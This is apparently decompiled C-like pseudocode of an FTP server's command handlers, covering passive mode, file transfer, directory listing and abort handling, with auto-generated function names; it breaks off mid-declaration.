// 112F0: using guessed type __int64 __fastcall nullsub_4(_QWORD);
// 2219EC: using guessed type int dword_2219EC;
// 221A24: using guessed type int dword_221A24;
// 221A74: using guessed type int dword_221A74;
// 221AB0: using guessed type int dword_221AB0;
// 221AD0: using guessed type int dword_221AD0;
// 221ADC: using guessed type int dword_221ADC;
// 221B50: using guessed type int dword_221B50;
// 221B68: using guessed type int dword_221B68;
// 221BA0: using guessed type int dword_221BA0;
// 221BB4: using guessed type int dword_221BB4;
// 221BD0: using guessed type int dword_221BD0;
// 221C00: using guessed type int dword_221C00;
// 221C3C: using guessed type int dword_221C3C;
// 221C60: using guessed type int dword_221C60;
// 221C70: using guessed type int dword_221C70;
// 221C84: using guessed type int dword_221C84;

//----- (00000000000053B0) ----------------------------------------------------
int __fastcall sub_53B0(__int64 a1, int a2, char a3, __int64 a4, int a5)
{
  int result; // eax

  if ( dword_221C20 )
  {
    sub_C3E0((__int64)&unk_220900, a2);
    sub_C6A0((char **)&unk_220900, a3);
    sub_C660((char **)&unk_220900, a4);
    sub_C230(a1, 7, (__int64)&unk_220900);
  }
  sub_C3A0((__int64)&unk_2208F0, a4);
  sub_CC50((__int64)&unk_2208F0, byte_17152, (const char *)&unk_17151);
  sub_C8D0((__int64)&unk_2208F0, 10, 0);
  sub_C3E0((__int64)&unk_220900, a2);
  sub_C6A0((char **)&unk_220900, a3);
  sub_C660((char **)&unk_220900, (__int64)&unk_2208F0);
  sub_C670((char **)&unk_220900, "\r\n");
  if ( a5 )
  {
    sub_130E0(0);
    sub_10F60(a1, &unk_220900, 1);
    return sub_13150(0);
  }
  else
  {
    result = sub_10F60(a1, &unk_220900, 1);
    if ( result )
      sub_4B80();
  }
  return result;
}
// 221C20: using guessed type int dword_221C20;

//----- (0000000000005510) ----------------------------------------------------
unsigned int __fastcall sub_5510(__int64 a1)
{
  sub_124F0(1, (__int64)sub_5690, a1, 1u);
  return j__alarm(seconds);
}

//----- (0000000000005540) ----------------------------------------------------
unsigned __int64 sub_5540()
{
  sub_12DE0(0);
  sub_12EA0(0);
  return sub_12F60(0);
}

//----- (0000000000005560) ----------------------------------------------------
int __fastcall sub_5560(__int64 a1, int a2, const char *a3)
{
  sub_C370((__int64)&unk_220910, a3);
  return sub_53B0(a1, a2, 32, (__int64)&unk_220910, 0);
}

//----- (00000000000055A0) ----------------------------------------------------
int __fastcall sub_55A0(__int64 a1, int a2, const char *a3)
{
  sub_C370((__int64)&unk_220910, a3);
  return sub_53B0(a1, a2, 45, (__int64)&unk_220910, 0);
}

//----- (00000000000055E0) ----------------------------------------------------
__int64 __fastcall sub_55E0(__int64 a1, const char *a2)
{
  __int64 result; // rax

  sub_C370((__int64)qword_2208E0, a2);
  if ( dword_221C20 )
    sub_C230(a1, 7, (__int64)qword_2208E0);
  result = sub_10F60(a1, qword_2208E0, 1);
  if ( (_DWORD)result )
    sub_4B80();
  return result;
}
// 2208E0: using guessed type _QWORD qword_2208E0[2];
// 221C20: using guessed type int dword_221C20;

//----- (0000000000005640) ----------------------------------------------------
void __fastcall __noreturn sub_5640(__int64 a1, int a2, const char *a3)
{
  sub_14540(0);
  sub_C370((__int64)&unk_220910, a3);
  sub_53B0(a1, a2, 32, (__int64)&unk_220910, 1);
  sub_14530(0);
  sub_12C90(0);
}

//----- (0000000000005690) ----------------------------------------------------
void __fastcall __noreturn sub_5690(__int64 a1)
{
  sub_5640(a1, 421, "Timeout.");
}

//----- (00000000000056A0) ----------------------------------------------------
int __fastcall sub_56A0(__int64 a1, int a2, __int64 a3)
{
  return sub_53B0(a1, a2, 45, a3, 0);
}

//----- (00000000000056B0) ----------------------------------------------------
int __fastcall sub_56B0(__int64 a1, int a2, __int64 a3)
{
  return sub_53B0(a1, a2, 32, a3, 0);
}

//----- (00000000000056C0) ----------------------------------------------------
unsigned int __fastcall sub_56C0(__int64 a1)
{
  unsigned int result; // eax

  result = seconds;
  if ( seconds )
    return sub_5510(a1);
  return result;
}

//----- (00000000000056E0) ----------------------------------------------------
__int64 __fastcall sub_56E0(__int64 a1, __int64 *a2, __int64 a3, int a4)
{
  _BYTE *v5; // rdx
  unsigned int i; // ebx
  __int64 result; // rax

  if ( a4 && seconds )
  {
    sub_5510(a1);
    v5 = *(_BYTE **)(a1 + 16);
    if ( v5 )
      goto LABEL_4;
  }
  else
  {
    v5 = *(_BYTE **)(a1 + 16);
    if ( v5 )
      goto LABEL_4;
  }
  sub_A800((unsigned __int64 *)(a1 + 16), 0x1000u);
  v5 = *(_BYTE **)(a1 + 16);
LABEL_4:
  if ( (int)sub_111A0((_DWORD *)a1, a2, v5) < 0 )
    sub_5640(a1, 500, "Input line too long.");
  sub_C8D0((__int64)a2, 0, 10);
  for ( i = sub_C500((__int64)a2); i; sub_C470(a2, i) )
  {
    if ( (unsigned __int8)sub_CEE0((__int64)a2, --i) != 13 )
      break;
  }
  if ( (unsigned int)sub_C500((__int64)a2) == 1 && (unsigned __int8)sub_CEE0((__int64)a2, 0) == 32 )
    sub_C570(a3);
  else
    sub_CD40((__int64)a2, a3, 32);
  sub_C750((__int64)a2);
  result = (unsigned int)dword_221C20;
  if ( dword_221C20 )
  {
    if ( sub_C600((__int64)a2, "PASS") )
    {
      sub_C370((__int64)&unk_2208D0, "PASS <password>");
    }
    else
    {
      sub_C3A0((__int64)&unk_2208D0, (__int64)a2);
      if ( !sub_C4F0(a3) )
      {
        sub_C6A0((char **)&unk_2208D0, 32);
        sub_C660((char **)&unk_2208D0, a3);
      }
    }
    return sub_C230(a1, 6, (__int64)&unk_2208D0);
  }
  return result;
}
// 221C20: using guessed type int dword_221C20;

//----- (00000000000058B0) ----------------------------------------------------
unsigned __int64 __fastcall sub_58B0(__int64 a1)
{
  bool v1; // zf
  unsigned int v4; // eax
  int v5; // edi
  __int64 v6[2]; // [rsp+0h] [rbp-68h] BYREF
  __int64 v7[2]; // [rsp+10h] [rbp-58h] BYREF
  __int64 v8[3]; // [rsp+20h] [rbp-48h] BYREF
  unsigned __int64 v9; // [rsp+38h] [rbp-30h]

  v9 = __readfsqword(0x28u);
  v1 = *(_DWORD *)(a1 + 40) == -1;
  v6[0] = 0LL;
  v6[1] = 0LL;
  v7[0] = 0LL;
  v7[1] = 0LL;
  v8[0] = 0LL;
  v8[1] = 0LL;
  if ( !v1 )
  {
    sub_56E0(a1, v6, (__int64)v7, 0);
    v4 = sub_C500((__int64)v6);
    if ( v4 > 3 )
      sub_CE50((__int64)v6, (__int64)v8, v4 - 4);
    if ( sub_C600((__int64)v8, "ABOR") )
    {
      v5 = *(_DWORD *)(a1 + 40);
      *(_DWORD *)(a1 + 144) = 1;
      sub_14530(v5);
    }
    else
    {
      sub_5560(a1, 500, "Unknown command.");
    }
    sub_C440((__int64)v6);
    sub_C440((__int64)v7);
    sub_C440((__int64)v8);
  }
  return __readfsqword(0x28u) ^ v9;
}

//----- (00000000000059D0) ----------------------------------------------------
__int64 __fastcall sub_59D0(__int64 a1)
{
  if ( dword_221C40 )
    return sub_E940(a1);
  else
    return sub_F540(a1);
}
// E940: using guessed type __int64 __fastcall sub_E940(_QWORD);
// 221C40: using guessed type int dword_221C40;

//----- (00000000000059F0) ----------------------------------------------------
int __fastcall sub_59F0(__int64 a1, int a2)
{
  _BOOL4 v2; // r13d
  unsigned __int16 v3; // bp
  char *v4; // rax
  int v5; // esi
  struct in_addr *v7; // rax
  char *v8; // rax
  const char *v9; // rax
  int v10; // eax
  const char *v11; // rdx
  int v12; // esi

  v2 = sub_14950(*(_WORD **)a1);
  if ( !a2 || sub_C4F0(a1 + 360) )
  {
LABEL_3:
    sub_59D0(a1);
    sub_14550((void **)(a1 + 32));
    if ( dword_221C40 )
    {
      v3 = sub_E960(a1);
      if ( !a2 )
        goto LABEL_5;
    }
    else
    {
      v3 = sub_F5A0(a1);
      if ( !a2 )
      {
LABEL_5:
        if ( cp )
        {
          sub_147A0((void **)&qword_220AA8);
          if ( !sub_14CA0(cp, (_WORD *)qword_220AA8) )
            sub_4B80();
        }
        else
        {
          sub_147E0((void **)&qword_220AA8, *(_QWORD *)a1);
        }
        sub_C370((__int64)&unk_220AB0, "Entering Passive Mode (");
        if ( v2 )
        {
          v7 = (struct in_addr *)sub_14A40(qword_220AA8);
          if ( v7 )
          {
            v8 = sub_14C90(v7);
            sub_C670((char **)&unk_220AB0, v8);
          }
          else
          {
            sub_C670((char **)&unk_220AB0, "0,0,0,0");
          }
        }
        else
        {
          v4 = sub_14C00(qword_220AA8);
          sub_C670((char **)&unk_220AB0, v4);
        }
        sub_C8D0((__int64)&unk_220AB0, 46, 44);
        sub_C670((char **)&unk_220AB0, ",");
        sub_C6C0((char **)&unk_220AB0, HIBYTE(v3));
        sub_C670((char **)&unk_220AB0, ",");
        sub_C6C0((char **)&unk_220AB0, (unsigned __int8)v3);
        sub_C670((char **)&unk_220AB0, ").");
        v5 = 227;
        return sub_56B0(a1, v5, (__int64)&unk_220AB0);
      }
    }
    sub_C370((__int64)&unk_220AB0, "Entering Extended Passive Mode (|||");
    sub_C6C0((char **)&unk_220AB0, v3);
    sub_C670((char **)&unk_220AB0, "|).");
    v5 = 229;
    return sub_56B0(a1, v5, (__int64)&unk_220AB0);
  }
  sub_C750(a1 + 360);
  if ( sub_C600(a1 + 360, "ALL") )
  {
    v11 = "EPSV ALL ok.";
    *(_DWORD *)(a1 + 148) = 1;
    v12 = 200;
  }
  else
  {
    v9 = (const char *)sub_C510((_QWORD *)(a1 + 360));
    v10 = sub_13230(v9);
    if ( (unsigned int)(v10 - 1) <= 1 && (v2 || v10 != 2) )
      goto LABEL_3;
    v11 = "Bad network protocol.";
    v12 = 522;
  }
  return sub_5560(a1, v12, v11);
}
// E960: using guessed type __int64 __fastcall sub_E960(_QWORD);
// 220AA8: using guessed type __int64 qword_220AA8;
// 221C40: using guessed type int dword_221C40;

//----- (0000000000005CC0) ----------------------------------------------------
__int64 __fastcall sub_5CC0(__int64 a1)
{
  int v2; // eax

  sub_C570((__int64)&unk_220A80);
  if ( sub_C4F0(a1) || (unsigned __int8)sub_CEE0(a1, 0) != 47 )
  {
    sub_D520((__int64)&unk_220A80);
    if ( sub_C4F0((__int64)&unk_220A80)
      || (v2 = sub_C500((__int64)&unk_220A80), (unsigned __int8)sub_CEE0((__int64)&unk_220A80, v2 - 1) != 47) )
    {
      sub_C6A0((char **)&unk_220A80, 47);
    }
  }
  sub_C660((char **)&unk_220A80, a1);
  return sub_C3A0(a1, (__int64)&unk_220A80);
}

//----- (0000000000005D70) ----------------------------------------------------
int __fastcall sub_5D70(__int64 a1)
{
  *(_DWORD *)(a1 + 144) = 0;
  return sub_5560(a1, 226, "ABOR successful.");
}

//----- (0000000000005D90) ----------------------------------------------------
__int64 __fastcall sub_5D90(char **a1, __int64 a2)
{
  __int64 result; // rax
  int v3; // ebp
  const char *v4; // rax

  result = sub_C500((__int64)a1);
  if ( (_DWORD)result )
  {
    v3 = result;
    result = sub_CEE0((__int64)a1, 0);
    if ( (_BYTE)result == 126 )
    {
      if ( v3 == 1 || (unsigned __int8)sub_CEE0((__int64)a1, 1u) == 47 )
      {
        sub_CD40((__int64)a1, (__int64)&unk_220AD0, 126);
        sub_C3A0((__int64)a1, a2 + 392);
        return sub_C660(a1, (__int64)&unk_220AD0);
      }
      result = (unsigned int)dword_221BD4;
      if ( dword_221BD4 )
      {
        sub_C3A0((__int64)&unk_220AD0, (__int64)a1);
        sub_CD40((__int64)&unk_220AD0, (__int64)qword_220AC0, 126);
        sub_CD40((__int64)qword_220AC0, (__int64)&unk_220AD0, 47);
        result = (__int64)sub_D850(qword_220AC0);
        if ( result )
        {
          v4 = (const char *)sub_14EB0(result);
          sub_C370((__int64)a1, v4);
          result = sub_C4F0((__int64)&unk_220AD0);
          if ( !(_DWORD)result )
          {
            sub_C6A0(a1, 47);
            return sub_C660(a1, (__int64)&unk_220AD0);
          }
        }
      }
    }
  }
  return result;
}
// 220AC0: using guessed type _QWORD qword_220AC0[2];
// 221BD4: using guessed type int dword_221BD4;

//----- (0000000000005EB0) ----------------------------------------------------
int __fastcall sub_5EB0(__int64 a1)
{
  _BOOL4 v1; // eax
  const char *v2; // rdx
  int v3; // eax

  sub_5D90((char **)(a1 + 360), a1);
  v1 = sub_10C30(a1 + 360);
  v2 = "Permission denied.";
  if ( !v1 )
    return sub_5560(a1, 550, v2);
  v3 = sub_D640((_QWORD *)(a1 + 360));
  v2 = "Failed to change directory.";
  if ( v3 )
    return sub_5560(a1, 550, v2);
  sub_DBC0(a1, 250);
  return sub_5560(a1, 250, "Directory successfully changed.");
}

//----- (0000000000005F30) ----------------------------------------------------
__int64 __fastcall sub_5F30(__int64 a1)
{
  if ( (unsigned int)sub_5F60(a1) )
    sub_4B30("port and pasv both active");
  return 1LL;
}

//----- (0000000000005F60) ----------------------------------------------------
__int64 __fastcall sub_5F60(__int64 a1)
{
  unsigned int v1; // ebx

  if ( dword_221C40 )
  {
    v1 = sub_E950(a1);
    if ( !v1 )
      return v1;
  }
  else
  {
    v1 = sub_F580(a1);
    if ( !v1 )
      return v1;
  }
  if ( *(_QWORD *)(a1 + 32) && (unsigned int)sub_5F30(a1) )
    sub_4B30("pasv and port both active");
  return v1;
}
// 5F30: using guessed type __int64 __fastcall sub_5F30(_QWORD);
// 221C40: using guessed type int dword_221C40;

//----- (0000000000005FD0) ----------------------------------------------------
__int64 __fastcall sub_5FD0(__int64 a1, const char *a2)
{
  unsigned int v2; // ebp

  if ( !(unsigned int)sub_5F60(a1) && (!*(_QWORD *)(a1 + 32) || !(unsigned int)sub_5F30(a1)) )
    sub_4B30("neither PORT nor PASV active in get_remote_transfer_fd");
  *(_DWORD *)(a1 + 144) = 0;
  if ( (unsigned int)sub_5F60(a1) )
  {
    v2 = sub_A1B0(a1);
    if ( (unsigned int)sub_13F40(v2) )
      return v2;
  }
  else
  {
    v2 = sub_A230((_WORD **)a1);
    if ( (unsigned int)sub_13F40(v2) )
      return v2;
  }
  sub_5560(a1, 150, a2);
  if ( (unsigned int)sub_A2B0((unsigned int *)a1) != 1 )
  {
    v2 = -1;
    sub_A0D0(a1);
  }
  return v2;
}

//----- (00000000000060A0) ----------------------------------------------------
__int64 __fastcall sub_60A0(__int64 a1)
{
  unsigned int v1; // ebx

  if ( (unsigned int)sub_5F60(a1) || *(_QWORD *)(a1 + 32) && (unsigned int)sub_5F30(a1) )
  {
    v1 = 1;
    if ( !dword_221AB0 )
      return v1;
    v1 = *(_DWORD *)(a1 + 412);
    if ( !v1 )
    {
      if ( dword_221BD8 )
      {
        if ( !*(_DWORD *)(a1 + 72) || dword_221AAC )
        {
LABEL_9:
          sub_5560(a1, 522, "Data connections must be encrypted.");
          return v1;
        }
      }
      else if ( dword_221AAC && *(_DWORD *)(a1 + 72) )
      {
        goto LABEL_9;
      }
    }
    return 1LL;
  }
  else
  {
    sub_5560(a1, 425, "Use PORT or PASV first.");
    return 0LL;
  }
}
// 221AAC: using guessed type int dword_221AAC;
// 221AB0: using guessed type int dword_221AB0;
// 221BD8: using guessed type int dword_221BD8;

//----- (0000000000006160) ----------------------------------------------------
int __fastcall sub_6160(__int64 a1, int a2)
{
  __off64_t v2; // r14
  const char *v3; // rdx
  int result; // eax
  unsigned int v5; // r13d
  int v6; // r15d
  __int64 v7; // rax
  const char *v8; // rax
  unsigned int v9; // ebp
  int v10; // ebp
  __int64 v11; // rdx
  __int64 v12; // r12
  int v13; // eax
  __int64 v14; // rdx

  v2 = *(_QWORD *)(a1 + 112);
  *(_QWORD *)(a1 + 112) = 0LL;
  if ( a2 || (result = sub_60A0(a1)) != 0 )
  {
    if ( *(_DWORD *)(a1 + 120) && v2 )
    {
      v3 = "No support for resume of ASCII transfer.";
      return sub_5560(a1, 550, v3);
    }
    sub_5D90((char **)(a1 + 360), a1);
    sub_C1A0((_QWORD *)a1, 2u);
    sub_C3A0(a1 + 320, a1 + 360);
    sub_5CC0(a1 + 320);
    if ( !sub_10C30(a1 + 360) )
    {
      v3 = "Permission denied.";
      return sub_5560(a1, 550, v3);
    }
    v5 = sub_D660((_QWORD *)(a1 + 360), 1);
    v6 = sub_13F40(v5);
    v3 = "Failed to open file.";
    if ( v6 )
      return sub_5560(a1, 550, v3);
    if ( dword_221B6C )
      sub_13E80(v5);
    sub_13900(v5, (struct stat64 **)&qword_220AA0);
    if ( !sub_13A20(qword_220AA0) )
    {
      sub_5560(a1, 550, "Failed to open file.");
      if ( sub_13A80(qword_220AA0) )
        sub_C250(a1);
      return sub_13880(v5);
    }
    sub_13150(v5);
    if ( *(_DWORD *)(a1 + 72) && dword_2219D4 && !(unsigned int)sub_13DB0(qword_220AA0) )
    {
      sub_5560(a1, 550, "Failed to open file.");
      return sub_13880(v5);
    }
    if ( v2 )
      sub_12A60(v5, v2);
    sub_C370((__int64)&unk_220A90, "Opening ");
    if ( dword_221ABC && *(_DWORD *)(a1 + 120) )
    {
      v6 = 1;
      sub_C670((char **)&unk_220A90, "ASCII");
    }
    else
    {
      sub_C670((char **)&unk_220A90, "BINARY");
    }
    sub_C670((char **)&unk_220A90, " mode data connection for ");
    sub_C660((char **)&unk_220A90, a1 + 360);
    sub_C670((char **)&unk_220A90, " (");
    v7 = sub_13D50(qword_220AA0);
    sub_C6F0((char **)&unk_220A90, v7);
    sub_C670((char **)&unk_220A90, " bytes).");
    if ( a2 )
    {
      v13 = sub_A3B0((unsigned int *)a1, 0, v5, 0, v6);
      *(_QWORD *)(a1 + 336) = v14;
      if ( !v13 )
        sub_C260(a1, 1);
      return sub_13880(v5);
    }
    v8 = (const char *)sub_C510(&unk_220A90);
    v9 = sub_5FD0(a1, v8);
    if ( (unsigned int)sub_13F40(v9) )
    {
LABEL_31:
      sub_14550((void **)(a1 + 32));
      sub_59D0(a1);
      return sub_13880(v5);
    }
    v10 = sub_A3B0((unsigned int *)a1, v9, v5, 0, v6);
    v12 = v11;
    if ( (unsigned int)sub_A0D0(a1) == 1 )
    {
      *(_QWORD *)(a1 + 336) = v12;
      if ( !v10 )
      {
        sub_C260(a1, 1);
        goto LABEL_39;
      }
    }
    else
    {
      *(_QWORD *)(a1 + 336) = v12;
      if ( !v10 )
      {
LABEL_28:
        sub_5560(a1, 426, "Failure writing network stream.");
        goto LABEL_29;
      }
    }
    if ( v10 == -1 )
    {
      sub_5560(a1, 451, "Failure reading local file.");
LABEL_29:
      if ( *(_DWORD *)(a1 + 144) )
        sub_5D70(a1);
      goto LABEL_31;
    }
    if ( v10 == -2 )
      goto LABEL_28;
LABEL_39:
    sub_5560(a1, 226, "Transfer complete.");
    goto LABEL_29;
  }
  return result;
}
// 63D8: variable 'v11' is possibly undefined
// 645C: variable 'v14' is possibly undefined
// 220AA0: using guessed type __int64 qword_220AA0;
// 2219D4: using guessed type int dword_2219D4;
// 221ABC: using guessed type int dword_221ABC;
// 221B6C: using guessed type int dword_221B6C;

//----- (0000000000006540) ----------------------------------------------------
int __fastcall sub_6540(__int64 a1, int a2, int a3)
{
  int result; // eax
  DIR *v5; // r12
  int v6; // r15d
  int v7; // r13d
  unsigned int v8; // eax
  int v9; // r14d
  char v10; // r14
  int v11; // eax

  sub_C570((__int64)&unk_220A70);
  sub_C570((__int64)&unk_220A60);
  sub_C370((__int64)qword_220A50, ".");
  if ( !a3 )
  {
    result = sub_60A0(a1);
    if ( !result )
      return result;
  }
  if ( sub_C4F0(a1 + 360) || (unsigned __int8)sub_CEE0(a1 + 360, 0) != 45 )
  {
    sub_C3A0((__int64)&unk_220A60, a1 + 360);
  }
  else
  {
    sub_CEA0(a1 + 360, (__int64)&unk_220A70, 1u);
    sub_CD40((__int64)&unk_220A70, (__int64)&unk_220A60, 32);
  }
  if ( !sub_C4F0((__int64)&unk_220A60) )
  {
    sub_5D90((char **)&unk_220A60, a1);
    if ( !sub_10C30((__int64)&unk_220A60) )
      return sub_5560(a1, 550, "Permission denied.");
    v5 = sub_D770(&unk_220A60);
    if ( v5 )
    {
      sub_C3A0((__int64)qword_220A50, (__int64)&unk_220A60);
      sub_C440((__int64)&unk_220A60);
      if ( a3 )
        goto LABEL_7;
      goto LABEL_20;
    }
    if ( (unsigned int)sub_CA70((__int64)&unk_220A60, 47) )
    {
      sub_C3A0((__int64)qword_220A50, (__int64)&unk_220A60);
      sub_CDA0((__int64)qword_220A50, (__int64)&unk_220A60, 47);
      if ( sub_C4F0((__int64)qword_220A50) )
        sub_C370((__int64)qword_220A50, "/");
    }
  }
  v5 = sub_D770(qword_220A50);
  if ( a3 )
  {
LABEL_7:
    v6 = a3;
    sub_C6A0((char **)&unk_220A70, 97);
    sub_55A0(a1, 213, "Status follows:");
    goto LABEL_8;
  }
LABEL_20:
  v8 = sub_5FD0(a1, "Here comes the directory listing.");
  v6 = sub_13F40(v8);
  if ( v6 )
  {
    if ( !v5 )
      goto LABEL_22;
    goto LABEL_32;
  }
LABEL_8:
  if ( !*(_DWORD *)(a1 + 72) )
  {
    if ( v5 )
      goto LABEL_11;
    goto LABEL_26;
  }
  if ( !v5 )
  {
LABEL_26:
    LOBYTE(v9) = 1;
    goto LABEL_27;
  }
  if ( dword_2219D4 )
  {
    sub_13A00(v5, (struct stat64 **)&qword_220A40);
    v9 = sub_13DB0(qword_220A40);
    if ( !v9 )
    {
LABEL_27:
      if ( a3 )
        goto LABEL_12;
      v10 = (v5 == 0LL) | (v9 ^ 1) & 1;
      if ( (unsigned int)sub_A0D0(a1) == 1 )
      {
        if ( !v10 )
          goto LABEL_45;
        goto LABEL_38;
      }
LABEL_29:
      if ( !v10 )
        goto LABEL_30;
LABEL_38:
      sub_5560(a1, 226, "Transfer done (but failed to open directory).");
LABEL_13:
      result = *(_DWORD *)(a1 + 144);
      if ( !result )
        goto LABEL_14;
      goto LABEL_31;
    }
  }
LABEL_11:
  v7 = sub_A3A0(
         a1,
         v6,
         (_DWORD)v5,
         (unsigned int)qword_220A50,
         (unsigned int)&unk_220A70,
         (unsigned int)&unk_220A60,
         a2);
  if ( a3 )
  {
LABEL_12:
    sub_5560(a1, 213, "End of status");
    goto LABEL_13;
  }
  v11 = sub_A0D0(a1);
  if ( !v7 )
  {
    v10 = v5 == 0LL;
    if ( v11 != 1 )
      goto LABEL_29;
  }
  if ( v7 )
  {
LABEL_30:
    sub_5560(a1, 426, "Failure writing network stream.");
    result = *(_DWORD *)(a1 + 144);
    if ( !result )
    {
LABEL_14:
      if ( !v5 )
        goto LABEL_15;
      goto LABEL_32;
    }
LABEL_31:
    result = sub_5D70(a1);
    if ( !v5 )
    {
LABEL_15:
      if ( a3 )
        return result;
LABEL_22:
      sub_14550((void **)(a1 + 32));
      return sub_59D0(a1);
    }
    goto LABEL_32;
  }
LABEL_45:
  sub_5560(a1, 226, "Directory send OK.");
  if ( *(_DWORD *)(a1 + 144) )
    goto LABEL_31;
LABEL_32:
  result = sub_135C0(v5);
  if ( !a3 )
    goto LABEL_22;
  return result;
}
// 6958: conditional instruction was optimized away because r12.8!=0
// A3A0: using guessed type __int64 __fastcall sub_A3A0(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 220A40: using guessed type __int64 qword_220A40;
// 220A50: using guessed type _QWORD qword_220A50[2];
// 2219D4: using guessed type int dword_2219D4;

//----- (0000000000006990) ----------------------------------------------------
unsigned __int64 __fastcall sub_6990(__int64 a1, int a2, int a3)
{
  __off64_t v4; // r15
  _QWORD *v6; // rbp
  unsigned int v7; // r12d
  const char *v8; // rax
  unsigned int v9; // r13d
  int v10; // eax
  int v11; // eax
  int v12; // r8d
  int v13; // eax
  __int64 v14; // rdx
  __int64 v15; // r15
  int v16; // r13d
  int v17; // eax
  bool v18; // zf
  int v19; // [rsp+4h] [rbp-64h]
  unsigned int v20; // [rsp+4h] [rbp-64h]
  __int64 v21; // [rsp+8h] [rbp-60h]
  char *v22[3]; // [rsp+10h] [rbp-58h] BYREF
  unsigned __int64 v23; // [rsp+28h] [rbp-40h]

  v4 = *(_QWORD *)(a1 + 112);
  *(_QWORD *)(a1 + 112) = 0LL;
  v23 = __readfsqword(0x28u);
  if ( (unsigned int)sub_60A0(a1) )
  {
    v6 = (_QWORD *)(a1 + 360);
    sub_5D90((char **)(a1 + 360), a1);
    v21 = a1 + 320;
    if ( a3 )
    {
      v10 = sub_D6A0((_QWORD *)(a1 + 360), &qword_220A20);
      v20 = 1;
      if ( (unsigned int)sub_13F40(v10) )
      {
        sub_C3A0((__int64)&unk_220A30, a1 + 360);
      }
      else
      {
        while ( 1 )
        {
          sub_C3A0((__int64)&unk_220A30, a1 + 360);
          sub_C6A0((char **)&unk_220A30, 46);
          sub_C6C0((char **)&unk_220A30, v20);
          v11 = sub_D6A0(&unk_220A30, &qword_220A20);
          if ( (unsigned int)sub_13F40(v11) )
            break;
          ++v20;
        }
      }
      sub_C1A0((_QWORD *)a1, 3u);
      sub_C3A0(v21, a1 + 360);
      v6 = &unk_220A30;
      sub_5CC0(v21);
      if ( sub_10C30((__int64)&unk_220A30) )
        goto LABEL_7;
    }
    else
    {
      sub_C1A0((_QWORD *)a1, 3u);
      sub_C3A0(a1 + 320, a1 + 360);
      sub_5CC0(a1 + 320);
      if ( sub_10C30(a1 + 360) )
      {
        if ( !*(_DWORD *)(a1 + 72) || dword_221AD8 )
        {
          v7 = sub_D700((_QWORD *)(a1 + 360));
          v19 = ((unsigned __int8)a2 ^ 1) & (v4 == 0);
LABEL_8:
          if ( (unsigned int)sub_13F40(v7) )
          {
            sub_5560(a1, 553, "Could not create file.");
            return __readfsqword(0x28u) ^ v23;
          }
          sub_13900(v7, (struct stat64 **)&qword_220A28);
          if ( sub_13A20(qword_220A28) )
            sub_13150(v7);
          if ( *(_DWORD *)(a1 + 72) && dword_221C18 )
          {
            sub_13E30(v7, dword_221A18);
            if ( dword_221C40 )
              sub_E980(a1, v7);
            else
              sub_F630(a1, v7);
          }
          if ( dword_221B6C )
            sub_13E70(v7);
          if ( v19 )
          {
            sub_158F0(v7);
            sub_12A60(v7, 0LL);
          }
          if ( (a2 & 1) == 0 && v4 )
          {
            sub_12A60(v7, v4);
          }
          else if ( a2 )
          {
            sub_12AB0(v7);
          }
          if ( a3 )
          {
            v22[0] = 0LL;
            v22[1] = 0LL;
            sub_C370((__int64)v22, "FILE: ");
            sub_C660(v22, (__int64)v6);
            v8 = (const char *)sub_C510(v22);
            v9 = sub_5FD0(a1, v8);
            sub_C440((__int64)v22);
          }
          else
          {
            v9 = sub_5FD0(a1, "Ok to send data.");
          }
          if ( (unsigned int)sub_13F40(v9) )
          {
            sub_14550((void **)(a1 + 32));
            sub_59D0(a1);
            if ( !dword_221A4C )
            {
LABEL_29:
              sub_13880(v7);
              return __readfsqword(0x28u) ^ v23;
            }
LABEL_46:
            sub_D620(v6);
            goto LABEL_29;
          }
          if ( !dword_221B70 || (v12 = 1, !*(_DWORD *)(a1 + 120)) )
            v12 = 0;
          v13 = sub_A3B0((unsigned int *)a1, v9, v7, 1, v12);
          v15 = v14;
          v16 = v13;
          v17 = sub_A0D0(a1);
          *(_QWORD *)(a1 + 336) = v15;
          if ( v17 == 1 )
          {
            if ( !v16 )
            {
              sub_C260(a1, 1);
              goto LABEL_55;
            }
          }
          else if ( !v16 )
          {
            LOBYTE(v16) = 1;
LABEL_41:
            sub_5560(a1, 426, "Failure reading network stream.");
            goto LABEL_42;
          }
          if ( v16 == -1 )
          {
            LOBYTE(v16) = 1;
            sub_5560(a1, 451, "Failure writing to local file.");
            goto LABEL_42;
          }
          v18 = v16 == -2;
          LOBYTE(v16) = 1;
          if ( v18 )
            goto LABEL_41;
LABEL_55:
          if ( *(_DWORD *)(a1 + 144) )
            goto LABEL_41;
          sub_5560(a1, 226, "Transfer complete.");
LABEL_42:
          if ( *(_DWORD *)(a1 + 144) )
            sub_5D70(a1);
          sub_14550((void **)(a1 + 32));
          sub_59D0(a1);
          if ( !dword_221A4C || !(_BYTE)v16 )
            goto LABEL_29;
          goto LABEL_46;
        }
LABEL_7:
        v19 = 0;
        v7 = sub_D6E0(v6);
        goto LABEL_8;
      }
    }
    sub_5560(a1, 550, "Permission denied.");
  }
  return __readfsqword(0x28u) ^ v23;
}
// 6CF0: variable 'v14' is possibly undefined
// E980: using guessed type __int64 __fastcall sub_E980(_QWORD, _QWORD);
// 220A20: using guessed type struct stat64 *qword_220A20;
// 220A28: using guessed type __int64 qword_220A28;
// 221A18: using guessed type int dword_221A18;
// 221A4C: using guessed type int dword_221A4C;
// 221AD8: using guessed type int dword_221AD8;
// 221B6C: using guessed type int dword_221B6C;
// 221B70: using guessed type int dword_221B70;
// 221C18: using guessed type int dword_221C18;
// 221C40: using guessed type int dword_221C40;

//----- (0000000000006EC0) ----------------------------------------------------
void __fastcall __noreturn sub_6EC0(_WORD **a1)
{
  const char *v2; // rsi
  int v3; // r15d
  __int64 v4; // rax
  int v5; // edx
  unsigned __int64 v6; // rbx
  int v7; // eax
  int v8; // r15d
  _BOOL4 v9; // ebx
  int v10; // r15d
  const void *v11; // rbx
  char v12; // al
  const char *v13; // rax
  __time_t v14; // rbx
  int v15; // r15d
  char *v16; // rax
  _WORD *v17; // rdi
  char *v18; // rax
  __int16 v19; // ax
  int v20; // eax
  const char *v21; // rsi
  __int16 v22; // ax
  unsigned int v23; // eax
  __int16 *v24; // rax
  const char *v25; // rdx
  __int16 v26; // bx
  __int16 v27; // bx
  const char *v28; // rax
  const char *v29; // rax
  const char *v30; // rax
  const char *v31; // rax
  const char *v32; // rax
  __int64 v33; // rbx
  __int64 v34; // rax
  int v35; // ebx
  char **v36; // [rsp+8h] [rbp-90h]
  void **v37; // [rsp+10h] [rbp-88h]
  _QWORD *v38; // [rsp+18h] [rbp-80h]
  unsigned int v39; // [rsp+24h] [rbp-74h]
